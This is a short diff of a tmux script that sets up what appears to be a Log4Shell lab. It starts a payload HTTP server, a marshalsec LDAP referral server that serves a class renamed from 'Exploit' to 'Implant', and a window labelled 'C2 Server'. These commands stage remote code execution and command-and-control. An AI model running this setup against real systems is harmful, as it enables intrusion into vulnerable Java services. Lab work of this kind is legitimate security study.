@@ -19,7 +19,7 @@ tmux send-keys -t $SESSION:2 "cd ~/log4jlab/payload && python3 -m http.server 88
 
 # Window 3: Marshalsec
 tmux new-window -t $SESSION -n "Marshalsec"
-tmux send-keys -t $SESSION:3 "cd ~/log4jlab/marshalsec && java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://127.0.0.1:8888/#Exploit'" C-m
+tmux send-keys -t $SESSION:3 "cd ~/log4jlab/marshalsec && java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://127.0.0.1:8888/#Implant'" C-m
 
 # Window 4: C2 Server
 tmux new-window -t $SESSION -n "C2 Server"
